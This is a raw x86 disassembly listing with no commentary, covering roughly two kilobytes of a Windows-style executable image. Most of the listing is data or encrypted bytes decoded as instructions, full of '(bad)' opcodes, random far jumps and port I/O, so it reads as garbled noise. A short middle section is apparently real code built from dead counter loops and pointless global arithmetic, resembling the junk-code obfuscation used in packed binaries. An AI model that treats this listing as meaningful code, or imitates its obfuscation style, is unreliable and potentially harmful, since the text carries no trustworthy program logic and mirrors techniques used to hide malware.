  40cc74:	les    esp,FWORD PTR [esi]
  40cc76:	xchg   ch,dl
  40cc78:	outs   dx,BYTE PTR ds:[esi]
  40cc79:	or     eax,0x53dab24b
  40cc7e:	test   DWORD PTR [edx],esi
  40cc80:	jge    0x40cc63
  40cc82:	fisub  WORD PTR [ebp+0xe]
  40cc85:	fwait
  40cc86:	inc    esi
  40cc87:	jle    0x40cc50
  40cc89:	pop    ebx
  40cc8a:	addr16 aam 0x81
  40cc8d:	call   0x9afae86
  40cc92:	ret    
  40cc93:	cli    
  40cc94:	mov    ecx,DWORD PTR [ecx]
  40cc96:	imul   esp,DWORD PTR [edx-0x5a],0x30da781f
  40cc9d:	push   ecx
  40cc9e:	xchg   ebx,eax
  40cc9f:	ficom  DWORD PTR [ebp+0x5c]
  40cca2:	cmp    BYTE PTR [ebx+0x10],ch
  40cca5:	mov    gs,WORD PTR [eax-0x31]
  40cca8:	inc    ecx
  40cca9:	mov    eax,ebp
  40ccab:	mov    WORD PTR [edi],ss
  40ccad:	repz jmp 0x1c11e182
  40ccb3:	mov    dl,0x32
  40ccb5:	mov    edx,DWORD PTR es:[ebx+0x51257111]
  40ccbc:	clc    
  40ccbd:	inc    ebx
  40ccbe:	rcr    DWORD PTR [edi],0x32
  40ccc1:	ins    BYTE PTR es:[edi],dx
  40ccc2:	mov    al,0x5
  40ccc4:	and    BYTE PTR [edi+ebx*1-0x54b3d4a8],bh
  40cccb:	jne    0x40cc90
  40cccd:	test   ebx,ecx
  40cccf:	xchg   BYTE PTR [ebx],al
  40ccd1:	jns    0x40cc71
  40ccd3:	neg    DWORD PTR [edx]
  40ccd5:	sub    al,0xdd
  40ccd7:	dec    BYTE PTR [eax]
  40ccd9:	pcmpeqw mm3,QWORD PTR [edx]
  40ccdc:	xchg   esp,edi
  40ccde:	xlat   BYTE PTR ds:[ebx]
  40ccdf:	xchg   ebx,eax
  40cce0:	stos   BYTE PTR es:[edi],al
  40cce1:	sub    edx,ebp
  40cce3:	pop    ebp
  40cce4:	outs   dx,BYTE PTR ds:[esi]
  40cce5:	dec    eax
  40cce6:	shl    BYTE PTR [esi+0x27],1
  40cce9:	lods   eax,DWORD PTR ds:[esi]
  40ccea:	jmp    0x98ab:0xf5d1c949
  40ccf1:	nop
  40ccf2:	fprem  
  40ccf4:	xor    eax,0x39bc810
  40ccf9:	dec    ecx
  40ccfa:	mov    ds:0xbd718f93,eax
  40ccff:	mov    dl,BYTE PTR ss:[eiz*8-0x3aba4593]
  40cd07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd08:	jo     0x1e784dea
  40cd0e:	stc    
  40cd0f:	dec    esi
  40cd10:	(bad)  
  40cd13:	hlt    
  40cd14:	xor    BYTE PTR [ebp+0x38],dl
  40cd17:	xchg   BYTE PTR [eax+ebx*8-0x48267ecd],ah
  40cd1e:	ret    
  40cd1f:	js     0x40cd97
  40cd21:	mov    al,ds:0x6fa321ff
  40cd26:	lods   eax,DWORD PTR ds:[esi]
  40cd27:	daa    
  40cd28:	cmp    edx,DWORD PTR [edx]
  40cd2a:	sub    al,0xb
  40cd2c:	xchg   edi,eax
  40cd2d:	mov    esp,0xb90cbafe
  40cd32:	sahf   
  40cd33:	push   eax
  40cd34:	lahf   
  40cd35:	pushf  
  40cd36:	(bad)  
  40cd37:	in     al,dx
  40cd38:	mov    DWORD PTR [esi],ebp
  40cd3a:	inc    ecx
  40cd3b:	test   DWORD PTR [ecx-0x208b7512],edx
  40cd41:	mov    ss,esi
  40cd43:	adc    ah,BYTE PTR [ecx-0x306e5d4]
  40cd49:	cmp    dh,ch
  40cd4b:	jno    0x40cdc6
  40cd4d:	retf   0x97d7
  40cd50:	dec    edi
  40cd51:	push   esp
  40cd52:	ins    DWORD PTR es:[edi],dx
  40cd53:	jb     0x40cd9b
  40cd55:	lds    ebp,FWORD PTR [eax+ebp*1-0x9f46d7]
  40cd5c:	adc    edx,DWORD PTR [ecx-0x24695ad8]
  40cd62:	das    
  40cd63:	push   0x12
  40cd65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd66:	add    al,0x93
  40cd68:	lahf   
  40cd69:	ins    DWORD PTR es:[edi],dx
  40cd6a:	rol    BYTE PTR [edx+0x17fed61b],1
  40cd70:	adc    BYTE PTR [esi],ch
  40cd72:	and    BYTE PTR [esi],bl
  40cd74:	call   0xe0d:0x419e975f
  40cd7b:	ret    0x9676
  40cd7e:	jmp    0x7e3f2e6d
  40cd83:	inc    ecx
  40cd84:	sub    ah,cl
  40cd86:	adc    al,0xca
  40cd88:	push   ebx
  40cd89:	push   esi
  40cd8a:	ror    BYTE PTR [esi-0x39],cl
  40cd8d:	lock and al,0xe4
  40cd90:	out    dx,eax
  40cd91:	pop    ebx
  40cd92:	dec    DWORD PTR [ebx-0x5ad4a54b]
  40cd98:	cmp    DWORD PTR [edx],ebx
  40cd9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd9b:	xchg   dh,bl
  40cd9d:	call   FWORD PTR ds:0x8a1955c8
  40cda3:	sbb    al,0xee
  40cda5:	pop    esp
  40cda6:	call   0x6436:0xffa0108d
  40cdad:	xor    DWORD PTR [ebx-0x6b5a398f],0xfffffff8
  40cdb4:	pushf  
  40cdb5:	shl    BYTE PTR [ecx-0x4e4a02db],1
  40cdbb:	aad    0x8b
  40cdbd:	jmp    0x5f887a75
  40cdc2:	loop   0x40ce17
  40cdc4:	pop    edx
  40cdc5:	mov    ebx,0x41c9e1aa
  40cdca:	mov    ds:0x39e001e,al
  40cdcf:	ret    0x6fe9
  40cdd2:	add    al,BYTE PTR [eax]
  40cdd4:	add    BYTE PTR [edi+0x4b],dh
  40cdd7:	and    eax,0x717221b4
  40cddc:	dec    ebx
  40cddd:	xchg   DWORD PTR [edx+0xeff91be],eax
  40cde3:	pop    eax
  40cde4:	dec    esi
  40cde5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cde6:	xor    BYTE PTR [eax+0x70],0xc9
  40cdea:	jle    0x40ce5c
  40cdec:	jo     0x40cdd5
  40cdee:	call   0x802f2c2e
  40cdf3:	mov    ah,0xf0
  40cdf5:	push   ebx
  40cdf6:	arpl   si,bx
  40cdf8:	call   DWORD PTR [ebx]
  40cdfa:	not    DWORD PTR [ebp-0x3be4127c]
  40ce00:	xchg   edi,eax
  40ce01:	pop    edx
  40ce02:	fs inc esp
  40ce04:	add    BYTE PTR [ebp+0x300c1fdb],bh
  40ce0a:	xchg   DWORD PTR [edi],edi
  40ce0c:	add    al,0x97
  40ce0e:	test   eax,0x67067e84
  40ce13:	cmp    esp,DWORD PTR [ebp+0x3c]
  40ce16:	sub    DWORD PTR [edi+0x54b7166f],ebx
  40ce1c:	in     al,dx
  40ce1d:	(bad)  
  40ce1f:	pop    edx
  40ce20:	push   ss
  40ce21:	ds pop ebp
  40ce23:	aas    
  40ce24:	add    dl,dl
  40ce26:	jl     0x40cea5
  40ce28:	push   cs
  40ce29:	test   DWORD PTR [ecx-0x3],edi
  40ce2c:	sub    al,0xd2
  40ce2e:	cmp    al,0x21
  40ce30:	xor    ah,dh
  40ce32:	cmp    eax,0x4e5db551
  40ce37:	mov    ebp,DWORD PTR [ecx-0x6118b30c]
  40ce3d:	xor    ebx,DWORD PTR [ebx+edx*8]
  40ce40:	and    ebp,ecx
  40ce42:	inc    esp
  40ce43:	jmp    0x52c71bc0
  40ce48:	add    DWORD PTR [edx],esp
  40ce4a:	push   ecx
  40ce4b:	mov    esp,0xe303aaa1
  40ce50:	idiv   ecx
  40ce52:	add    cl,BYTE PTR [eax-0x16]
  40ce55:	xlat   BYTE PTR ds:[ebx]
  40ce56:	fnstcw WORD PTR [ecx]
  40ce58:	sbb    BYTE PTR [edi-0x126eadad],0xfd
  40ce5f:	leave  
  40ce60:	mov    bl,0x1f
  40ce62:	fmul   QWORD PTR [esi+0xb]
  40ce65:	dec    eax
  40ce66:	xchg   ecx,eax
  40ce67:	sub    BYTE PTR [edx+0x57],dh
  40ce6a:	dec    esi
  40ce6b:	push   0xf779b494
  40ce70:	mov    dh,0x65
  40ce72:	sub    DWORD PTR [eax-0x10],esp
  40ce75:	imul   ebp,DWORD PTR [ebx],0x6d
  40ce78:	ret    0x1bd7
  40ce7b:	mov    al,fs:0x47e27764
  40ce81:	ret    
  40ce82:	push   ecx
  40ce83:	pop    esi
  40ce84:	cmc    
  40ce85:	cmc    
  40ce86:	xor    dh,BYTE PTR [eax+0x33]
  40ce89:	mov    es:0x83806eb3,al
  40ce8f:	xchg   ebp,eax
  40ce90:	cs xchg ebp,eax
  40ce92:	mov    esi,0xe7491272
  40ce97:	inc    ebx
  40ce98:	stos   DWORD PTR es:[edi],eax
  40ce99:	sbb    edx,DWORD PTR [esi]
  40ce9b:	mov    al,BYTE PTR [edi+0x37]
  40ce9e:	iret   
  40ce9f:	loop   0x40ced4
  40cea1:	loope  0x40ce58
  40cea3:	cmp    al,0x66
  40cea5:	shl    al,cl
  40cea7:	scas   eax,DWORD PTR es:[edi]
  40cea8:	pop    ds
  40cea9:	xchg   ebp,eax
  40ceaa:	xor    ah,BYTE PTR [eax+0x5e]
  40cead:	(bad)  
  40ceae:	and    BYTE PTR [ebx-0x7e330843],cl
  40ceb4:	stos   BYTE PTR es:[edi],al
  40ceb5:	daa    
  40ceb6:	dec    ecx
  40ceb7:	and    bh,BYTE PTR [eax-0x5dbe9ac4]
  40cebd:	jns    0x40cf3d
  40cebf:	jne    0x40ced0
  40cec1:	aaa    
  40cec2:	jle    0x40ce63
  40cec4:	mov    bl,BYTE PTR [ecx]
  40cec6:	cmp    WORD PTR [eax],ax
  40cec9:	jmp    0x40cec7
  40cecb:	sub    esi,DWORD PTR [esp+ecx*8+0x3cd3898]
  40ced2:	aam    0xfa
  40ced4:	aas    
  40ced5:	cwde   
  40ced6:	enter  0x9a98,0x8a
  40ceda:	aad    0xec
  40cedc:	xchg   edx,eax
  40cedd:	mov    eax,0x422b24be
  40cee2:	adc    cl,BYTE PTR [ebx]
  40cee4:	xor    al,0xe7
  40cee6:	jns    0x40ce9f
  40cee8:	(bad)  
  40cee9:	jmp    0x7582dc7f
  40ceee:	xor    DWORD PTR [ebp-0x12c116cc],edx
  40cef4:	sbb    al,0x41
  40cef6:	stos   BYTE PTR es:[edi],al
  40cef7:	daa    
  40cef8:	mov    dl,0xcb
  40cefa:	jo     0x40ceb2
  40cefc:	js     0x40cf21
  40cefe:	push   ebx
  40ceff:	xchg   edi,eax
  40cf00:	repnz add al,BYTE PTR [ecx]
  40cf03:	and    bl,dl
  40cf05:	retf   
  40cf06:	or     dh,bh
  40cf08:	(bad)  [esi]
  40cf0a:	and    al,0x9d
  40cf0c:	lods   al,BYTE PTR ds:[esi]
  40cf0d:	lods   eax,DWORD PTR ds:[esi]
  40cf0e:	mov    ah,0xec
  40cf10:	aam    0x79
  40cf12:	mov    ah,0x55
  40cf14:	xor    ecx,edx
  40cf16:	mov    ds:0x2283e710,eax
  40cf1b:	sahf   
  40cf1c:	outs   dx,DWORD PTR ds:[esi]
  40cf1d:	add    eax,0x1f7cf0a1
  40cf22:	mov    fs,WORD PTR [edi-0x52]
  40cf25:	xchg   edx,eax
  40cf26:	ds int3 
  40cf28:	sti    
  40cf29:	inc    ebx
  40cf2a:	test   BYTE PTR [edx+0x2b],dl
  40cf2d:	add    BYTE PTR [ebx],al
  40cf2f:	scas   eax,DWORD PTR es:[edi]
  40cf30:	popf   
  40cf31:	inc    esi
  40cf32:	pop    ebx
  40cf33:	ins    DWORD PTR es:[edi],dx
  40cf34:	dec    ecx
  40cf35:	js     0x40cf80
  40cf37:	pop    ss
  40cf38:	push   0xb65e44f0
  40cf3d:	ds push ecx
  40cf3f:	repnz shl DWORD PTR [esi-0x5efc6599],1
  40cf46:	mov    eax,ds:0x1955957d
  40cf4b:	xchg   edi,eax
  40cf4c:	cwde   
  40cf4d:	aam    0x8f
  40cf4f:	addr16 popa 
  40cf51:	loopne 0x40cee5
  40cf53:	xor    ebx,edx
  40cf55:	jge    0x40cf91
  40cf57:	and    edx,DWORD PTR [ebx-0x67]
  40cf5a:	adc    eax,0xac92591f
  40cf5f:	push   esi
  40cf60:	jmp    0x40cf1b
  40cf62:	pop    ebx
  40cf63:	sar    BYTE PTR [ebx-0x44],0xd7
  40cf67:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40cf69:	inc    eax
  40cf6a:	call   0xa86d:0x489b1ce4
  40cf71:	call   0x4306107f
  40cf76:	cmp    ch,BYTE PTR [ebx-0x20]
  40cf79:	popa   
  40cf7a:	dec    esi
  40cf7b:	jp     0x40cf7a
  40cf7d:	mov    ds:0x48e2c776,al
  40cf82:	in     al,dx
  40cf83:	pop    esp
  40cf84:	repz es mov ch,0x3c
  40cf88:	scas   eax,DWORD PTR es:[edi]
  40cf89:	xor    BYTE PTR [eax],bl
  40cf8b:	loope  0x40cf21
  40cf8d:	popf   
  40cf8e:	leave  
  40cf8f:	push   ebx
  40cf90:	cmp    al,0x4c
  40cf92:	pop    ds
  40cf93:	dec    eax
  40cf94:	(bad)  
  40cf95:	fst    QWORD PTR [edi-0x7]
  40cf98:	push   ebx
  40cf99:	loopne 0x40cf46
  40cf9b:	push   0x31
  40cf9d:	mov    dl,0x72
  40cf9f:	jmp    0x2a26ba00
  40cfa4:	ret    
  40cfa5:	push   0x75
  40cfa7:	fidiv  DWORD PTR [edi+0x50]
  40cfaa:	popa   
  40cfab:	outs   dx,BYTE PTR ds:[esi]
  40cfac:	xor    ecx,eax
  40cfae:	fld    TBYTE PTR [esp+edi*2+0x52]
  40cfb2:	mov    cl,0xdc
  40cfb4:	add    DWORD PTR [si+0x6b],esp
  40cfb8:	lds    esi,FWORD PTR [edi-0x31]
  40cfbb:	out    dx,eax
  40cfbc:	ja     0x40cf7c
  40cfbe:	scas   al,BYTE PTR es:[edi]
  40cfbf:	iret   
  40cfc0:	rol    DWORD PTR [esp+eiz*8],cl
  40cfc3:	dec    esi
  40cfc4:	pop    esp
  40cfc5:	out    0x23,eax
  40cfc7:	push   ds
  40cfc8:	sub    DWORD PTR [esi],0xdbc080e3
  40cfce:	pop    edx
  40cfcf:	add    DWORD PTR [edx+0x2e811c3a],eax
  40cfd5:	cmp    al,0x8c
  40cfd7:	mov    ah,0x81
  40cfd9:	or     eax,0xe02f2783
  40cfde:	ret    
  40cfdf:	retf   0x75d6
  40cfe2:	sbb    al,0x7e
  40cfe4:	sbb    esp,DWORD PTR [esi+eiz*4+0x52]
  40cfe8:	and    al,0xca
  40cfea:	pop    eax
  40cfeb:	fld    st(5)
  40cfed:	dec    ebx
  40cfee:	sbb    BYTE PTR [ecx+esi*1-0x5e],dl
  40cff2:	neg    DWORD PTR [esi+0x6c]
  40cff5:	push   ss
  40cff6:	out    0x40,eax
  40cff8:	retf   
  40cff9:	sbb    DWORD PTR es:[edx+ecx*4],esi
  40cffd:	mov    edx,0xc697c73b
  40d002:	mov    ebx,0x861cb2ee
  40d007:	clc    
  40d008:	scas   al,BYTE PTR es:[edi]
  40d009:	mov    ebp,0x2bdf5b36
  40d00e:	xlat   BYTE PTR ds:[ebx]
  40d00f:	loop   0x40d081
  40d011:	sbb    edi,ecx
  40d013:	push   ss
  40d014:	imul   esp,DWORD PTR [ebx+esi*1],0x2e7839c9
  40d01b:	in     eax,0xfc
  40d01d:	mov    ecx,0x8a6d872f
  40d022:	mov    dl,0x57
  40d024:	push   ds
  40d025:	jmp    0x991c8f15
  40d02a:	pop    edi
  40d02b:	xchg   edx,eax
  40d02c:	ror    DWORD PTR [ebx+0x176ef80c],cl
  40d032:	jle    0x40d057
  40d034:	mov    edi,0xb552589b
  40d039:	or     esp,esp
  40d03b:	stos   DWORD PTR es:[edi],eax
  40d03c:	and    dl,BYTE PTR [ebx]
  40d03e:	push   esp
  40d03f:	loopne 0x40d0a9
  40d041:	pusha  
  40d042:	out    0x57,eax
  40d044:	mov    ds:0x41621c,eax
  40d049:	mov    eax,DWORD PTR [ebp+0xc]
  40d04c:	xor    eax,ecx
  40d04e:	add    eax,edx
  40d050:	mov    ds:0x416224,eax
  40d055:	jmp    0x40d064
  40d05a:	mov    eax,ds:0x416224
  40d05f:	mov    ds:0x41621c,eax
  40d064:	mov    eax,DWORD PTR [ebp+0x8]
  40d067:	mov    eax,DWORD PTR [eax]
  40d069:	mov    ecx,DWORD PTR ds:0x41621c
  40d06f:	add    DWORD PTR [eax],ecx
  40d071:	pop    esi
  40d072:	pop    ebp
  40d073:	ret    0x8
  40d076:	push   ebp
  40d077:	mov    ebp,esp
  40d079:	sub    esp,0x30
  40d07c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d083:	mov    eax,ds:0x4343be
  40d088:	mov    ecx,DWORD PTR ds:0x432972
  40d08e:	sub    eax,ecx
  40d090:	and    eax,DWORD PTR [eax+ecx*1]
  40d093:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  40d09a:	mov    DWORD PTR ds:0x434396,0x14
  40d0a4:	cmp    DWORD PTR ds:0x434396,0x0
  40d0ab:	je     0x40d158
  40d0b1:	cmp    DWORD PTR ds:0x434396,0x3
  40d0b8:	jne    0x40d0d1
  40d0be:	push   0x143e
  40d0c3:	push   0x3596
  40d0c8:	push   DWORD PTR [ebp-0xc]
  40d0cb:	call   DWORD PTR ds:0x432c6a
  40d0d1:	cmp    DWORD PTR ds:0x434396,0x4
  40d0d8:	jne    0x40d0e9
  40d0de:	mov    eax,ds:0x434396
  40d0e3:	dec    eax
  40d0e4:	mov    ds:0x434396,eax
  40d0e9:	xor    eax,eax
  40d0eb:	add    eax,DWORD PTR ds:0x434396
  40d0f1:	dec    eax
  40d0f2:	mov    ds:0x434396,eax
  40d0f7:	jmp    0x40d0a4
  40d0fc:	and    DWORD PTR ds:0x434372,0x0
  40d106:	jmp    0x40d118
  40d10b:	mov    ecx,DWORD PTR ds:0x434372
  40d111:	inc    ecx
  40d112:	mov    DWORD PTR ds:0x434372,ecx
  40d118:	cmp    DWORD PTR ds:0x434372,0x18
  40d11f:	jae    0x40d158
  40d125:	cmp    DWORD PTR ds:0x434372,0x20
  40d12c:	jne    0x40d13d
  40d132:	push   0x432dc6
  40d137:	call   DWORD PTR ds:0x4329ee
  40d13d:	jmp    0x40d10b
  40d142:	xor    ecx,ecx
  40d144:	xor    ecx,DWORD PTR ds:0x432e6c
  40d14a:	xor    eax,eax
  40d14c:	add    eax,DWORD PTR ds:0x434431
  40d152:	sub    eax,ecx
  40d154:	imul   ecx,DWORD PTR [ecx+eax*1]
  40d158:	mov    ecx,DWORD PTR [ebp-0x4]
  40d15b:	add    DWORD PTR ds:0x43437e,0x5a83
  40d165:	push   ebx
  40d166:	mov    eax,0x7510855
  40d16b:	sbb    ebx,DWORD PTR ds:0x432dde
  40d171:	xor    ecx,eax
  40d173:	sbb    DWORD PTR ds:0x432704,ebx
  40d179:	mov    ebx,0x32729c
  40d17e:	add    ecx,ebx
  40d180:	and    DWORD PTR ds:0x434421,0x2948
  40d18a:	mov    DWORD PTR [ebp-0x1c],ecx
  40d18d:	mov    DWORD PTR ds:0x43438a,0x11
  40d197:	cmp    DWORD PTR ds:0x43438a,0x0
  40d19e:	je     0x40d204
  40d1a4:	cmp    DWORD PTR ds:0x43438a,0x8
  40d1ab:	jne    0x40d1c4
  40d1b1:	push   0x6033
  40d1b6:	push   DWORD PTR [ebp-0xc]
  40d1b9:	push   0x6be4
  40d1be:	call   DWORD PTR ds:0x432c6e
  40d1c4:	cmp    DWORD PTR ds:0x43438a,0x9
  40d1cb:	jne    0x40d1e0
  40d1d1:	xor    ecx,ecx
  40d1d3:	xor    ecx,DWORD PTR ds:0x43438a
  40d1d9:	dec    ecx
  40d1da:	mov    DWORD PTR ds:0x43438a,ecx
  40d1e0:	mov    ecx,DWORD PTR ds:0x43438a
  40d1e6:	dec    ecx
  40d1e7:	mov    DWORD PTR ds:0x43438a,ecx
  40d1ed:	jmp    0x40d197
  40d1f2:	mov    ecx,DWORD PTR ds:0x432dd6
  40d1f8:	sub    ecx,DWORD PTR ds:0x434396
  40d1fe:	mov    DWORD PTR ds:0x432dd6,ecx
  40d204:	mov    ecx,DWORD PTR [ebp+0x14]
  40d207:	sbb    DWORD PTR ds:0x43436e,0x39f6
  40d211:	push   esi
  40d212:	adc    DWORD PTR ds:0x434425,0x43436a
  40d21c:	push   edi
  40d21d:	adc    DWORD PTR ds:0x434376,0x784e
  40d227:	test   ecx,ecx
  40d229:	mov    DWORD PTR ds:0x434415,0x1f53
  40d233:	je     0x40d303
  40d239:	and    DWORD PTR ds:0x434421,0x0
  40d243:	jmp    0x40d255
  40d248:	mov    ecx,DWORD PTR ds:0x434421
  40d24e:	inc    ecx
  40d24f:	mov    DWORD PTR ds:0x434421,ecx
  40d255:	cmp    DWORD PTR ds:0x434421,0x11
  40d25c:	jae    0x40d2ec
  40d262:	cmp    DWORD PTR ds:0x434421,0x16
  40d269:	jne    0x40d286
  40d26f:	push   0x8d47
  40d274:	push   DWORD PTR [ebp-0x14]
  40d277:	push   DWORD PTR [ebp-0x1c]
  40d27a:	push   DWORD PTR [ebp-0x28]
  40d27d:	push   DWORD PTR [ebp-0x18]
  40d280:	call   DWORD PTR ds:0x4329f2
  40d286:	jmp    0x40d248
  40d28b:	mov    DWORD PTR ds:0x4326fc,0x13
  40d295:	cmp    DWORD PTR ds:0x4326fc,0x0
  40d29c:	je     0x40d2ec
  40d2a2:	cmp    DWORD PTR ds:0x4326fc,0x9
  40d2a9:	jne    0x40d2ba
  40d2af:	push   0x8
  40d2b1:	push   DWORD PTR [ebp-0x20]
  40d2b4:	call   DWORD PTR ds:0x432d22
  40d2ba:	cmp    DWORD PTR ds:0x4326fc,0xa
  40d2c1:	jne    0x40d2d4
  40d2c7:	mov    esi,DWORD PTR ds:0x4326fc
  40d2cd:	dec    esi
  40d2ce:	mov    DWORD PTR ds:0x4326fc,esi
  40d2d4:	mov    esi,DWORD PTR ds:0x4326fc
  40d2da:	dec    esi
  40d2db:	mov    DWORD PTR ds:0x4326fc,esi
  40d2e1:	jmp    0x40d295
  40d2e6:	not    DWORD PTR ds:0x4326f4
  40d2ec:	mov    ecx,DWORD PTR [ebp+0x14]
  40d2ef:	neg    esi
  40d2f1:	mov    ecx,DWORD PTR [ecx]
  40d2f3:	movzx  esi,WORD PTR ds:0x434429
  40d2fa:	add    DWORD PTR ds:0x434392,esi
  40d300:	mov    DWORD PTR [ebp-0x1c],ecx
  40d303:	imul   edx,eax
  40d306:	jmp    0x40d6fa
  40d30b:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  40d311:	imul   esi,DWORD PTR gs:[eax+0x3],0x674a624d
  40d319:	call   0x70ce51ef
  40d31e:	jo     0x40d369
  40d320:	jge    0x40d392
  40d322:	jo     0x40d2cc
  40d324:	and    dl,BYTE PTR [edx+0x36]
  40d327:	cli    
  40d328:	add    eax,0x6841814b
  40d32d:	and    al,0x6
  40d32f:	cmc    
  40d330:	mov    bh,0x8c
  40d332:	ins    BYTE PTR es:[edi],dx
  40d333:	mov    eax,ds:0xa77a7655
  40d338:	jnp    0x40d3b5
  40d33a:	pop    ecx
  40d33b:	cmp    BYTE PTR [ebx+0x76cdb2a7],cl
  40d341:	xchg   DWORD PTR [ecx+edx*2],edx
  40d344:	ja     0x40d343
  40d346:	repnz mov al,ds:0x32e9fd0f
  40d34c:	cli    
  40d34d:	sbb    cl,BYTE PTR [edx+0x3a6ed569]
  40d353:	pop    ss
  40d354:	jecxz  0x40d365
  40d356:	mov    ebx,0x32fa2ea5
  40d35b:	adc    DWORD PTR [ebx+0x3d],esp
  40d35e:	pop    ss
  40d35f:	cmp    bl,BYTE PTR [esi]
  40d361:	inc    eax
  40d362:	dec    eax
  40d363:	sub    al,0x52
  40d365:	ds xor al,0x4b
  40d368:	inc    edx
  40d369:	out    0xdc,al
  40d36b:	mov    BYTE PTR [ebp+eax*2+0x1a693ec2],dl
  40d372:	or     al,0xcd
  40d374:	jno    0x40d333
  40d376:	in     eax,dx
  40d377:	ror    DWORD PTR [edx-0x4d185bb4],0xd1
  40d37e:	mov    dh,0x8a
  40d380:	shr    BYTE PTR [ebx+0x4e],0xb1
  40d384:	dec    esi
  40d385:	lea    esi,[eax]
  40d387:	mov    ch,0x1f
  40d389:	test   eax,0xeb668f2f
  40d38e:	pusha  
  40d38f:	inc    esp
  40d390:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d391:	pusha  
  40d392:	sbb    dh,bl
  40d394:	sbb    DWORD PTR [edi+0x43b40c6a],0x3
  40d39b:	fisttp QWORD PTR [ecx]
  40d39d:	add    bl,BYTE PTR [esi]
  40d39f:	rcl    al,cl
  40d3a1:	jl     0x40d410
  40d3a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3a4:	mov    ds:0x1eb7c230,al
  40d3a9:	inc    ecx
  40d3aa:	inc    ebp
  40d3ab:	xchg   bh,bh
  40d3ad:	xor    eax,0x18111fb5
  40d3b2:	fs pop ecx
  40d3b4:	(bad)  
  40d3b6:	jl     0x40d3f9
  40d3b8:	in     eax,0xac
  40d3ba:	cmp    eax,0x818006e7
  40d3bf:	adc    DWORD PTR [ebx+0x18],0x66
  40d3c3:	jmp    0xbe23:0xad748109
  40d3ca:	int    0x1
  40d3cc:	dec    ecx
  40d3cd:	shr    DWORD PTR [edx-0x6f],0xcf
  40d3d1:	xor    DWORD PTR fs:[ecx],0x1fd3b7b3
  40d3d8:	push   ebx
  40d3d9:	out    dx,al
  40d3da:	je     0x40d3cc
  40d3dc:	add    dh,bh
  40d3de:	pop    edx
  40d3df:	aas    
  40d3e0:	and    edx,DWORD PTR [eax-0x4f]
  40d3e3:	cwde   
  40d3e4:	test   esp,0x957242ba
  40d3ea:	out    dx,al
  40d3eb:	mov    al,ds:0x4ae5e520
  40d3f0:	call   0x20fba5f1
  40d3f5:	mov    edx,DWORD PTR [edx+0x6f9e9314]
  40d3fb:	int    0xdf
  40d3fd:	add    BYTE PTR [edi+0x34],dh
  40d400:	call   0xf5f8:0xe72776e5
  40d407:	jnp    0x40d397
  40d409:	mov    gs,WORD PTR [ebx]
  40d40b:	inc    ebp
  40d40c:	push   ebx
  40d40d:	gs inc edi
  40d40f:	mov    bh,0x15
  40d411:	pop    eax
  40d412:	pusha  
  40d413:	shl    BYTE PTR [edi+0x1f],0x66
  40d417:	push   ebx
  40d418:	xchg   ebx,eax
  40d419:	lds    ecx,FWORD PTR [eax+0x751e5fb5]
  40d41f:	push   ebx
  40d420:	cmc    
  40d421:	mov    ecx,0x3cf74669
  40d426:	stos   BYTE PTR es:[edi],al
  40d427:	cmp    DWORD PTR [edx+edx*1],edi
  40d42a:	test   BYTE PTR [eiz*2+0x468abb31],ah
  40d431:	mov    esi,0x6231b7b2
  40d436:	call   0xb0d9:0x855cdab7
  40d43d:	sbb    dh,BYTE PTR [ebx+0x4b1a7c5]
  40d443:	outs   dx,BYTE PTR ds:[esi]
  40d444:	mov    esi,0xcc623ac3
  40d449:	xchg   esp,eax
  40d44a:	outs   dx,BYTE PTR ds:[esi]
  40d44b:	xchg   ebp,eax
  40d44c:	in     eax,dx
  40d44d:	fadd   QWORD PTR [edx]
  40d44f:	rol    ah,cl
  40d451:	jge    0x40d4ba
  40d453:	rol    esi,1
  40d455:	pusha  
  40d456:	sbb    al,0x2
  40d458:	cdq    
  40d459:	ja     0x40d4b8
  40d45b:	mov    ds,WORD PTR [eax]
  40d45d:	loop   0x40d4cd
  40d45f:	mov    WORD PTR [edi-0x579de9fe],cs
  40d465:	add    BYTE PTR [eax],0x6c
  40d468:	sbb    DWORD PTR [esi+0x1f5493d],eax
  40d46e:	cli    
  40d46f:	push   cs
  40d470:	xchg   ebp,eax
  40d471:	stos   DWORD PTR es:[edi],eax
  40d472:	call   0x8270:0x21378cd0
  40d479:	jmp    0x1ba4:0xd1b5ff59
  40d480:	sbb    cl,BYTE PTR ds:0x8e6379af
  40d486:	ds jp  0x40d43d
  40d489:	and    ecx,esi
  40d48b:	inc    esp
  40d48c:	push   esi
  40d48d:	jmp    0xc567ff15
  40d492:	xchg   ebp,eax
  40d493:	cmp    DWORD PTR [ebx-0x4046e461],edx
  40d499:	cmp    eax,0x64b8f9d5
  40d49e:	add    eax,0x8f4414f7
  40d4a3:	cwde   
  40d4a4:	inc    edx
  40d4a5:	cmp    al,0x52
  40d4a7:	into   
  40d4a8:	push   ecx
  40d4a9:	and    bl,ah
  40d4ab:	dec    edx
  40d4ac:	je     0x40d490
  40d4ae:	inc    ecx
  40d4af:	mov    ebx,0xafb8c948
  40d4b4:	lahf   
  40d4b5:	daa    
  40d4b6:	mov    al,0xee
  40d4b8:	add    al,BYTE PTR [edi+0x19]
  40d4bb:	xor    DWORD PTR [eax-0x4],0x36
  40d4bf:	mov    esp,0x4cdb4e10
  40d4c4:	lods   al,BYTE PTR ds:[esi]
  40d4c5:	mov    ebx,0x2464f829
  40d4ca:	push   0xffffffc6
  40d4cc:	or     edx,DWORD PTR ds:0xaa4ec6e8
  40d4d2:	out    0xfa,eax
  40d4d4:	xor    edi,DWORD PTR [ebp-0x43]
  40d4d7:	dec    edi
  40d4d8:	ror    DWORD PTR [ecx],1
  40d4da:	dec    edx
  40d4db:	cmp    al,0xef
  40d4dd:	mov    ebx,0xdfaa9850
  40d4e2:	sub    al,0x43
  40d4e4:	popf   
  40d4e5:	jmp    0x40d50f
  40d4e7:	mov    ecx,0xb1985070
  40d4ec:	and    BYTE PTR [edx],ch
  40d4ee:	aam    0x82
  40d4f0:	retf   0x9fbd
  40d4f3:	pop    ebp
  40d4f4:	shl    DWORD PTR [ebx+0x3a],0xd3
